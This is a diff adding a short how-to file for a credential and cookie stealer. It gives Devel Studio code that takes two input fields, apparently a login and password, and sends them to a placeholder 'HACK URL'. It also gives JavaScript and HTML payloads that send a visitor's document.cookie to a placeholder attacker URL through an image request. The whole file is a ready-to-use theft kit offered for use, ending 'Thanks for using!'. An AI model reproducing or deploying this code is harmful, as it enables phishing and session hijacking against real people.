@@ -1,1 +1,18 @@
-
+You need Devel Studio 3.0 or other or site
+Create new project
+And make everything in your style
+In the "events" tab, add a click
+Code for Devel Studio:
+$edit1 = c('edit1')->text;
+$edit2 = c('edit2')->text;
+$url = 'Your HACK URL';
+file_get_contents($url . '?' . $edit1 . ':' . $edit2);
+MessageBox('TEXT', 'TEXT');
+And you can import this in JavaScript and HTML
+Code for JavaScript:
+javascript:document.write('<script>img = new Image(); img.src = "YOUR URL?cookie="+document.cookie;</script>')
+If don`t work:
+<script>img = new Image(); img.src = "YOUR URL?cookie="+document.cookie;</script>
+Code for HTML:
+<img src="YOUR URL">
+Thanks for using!
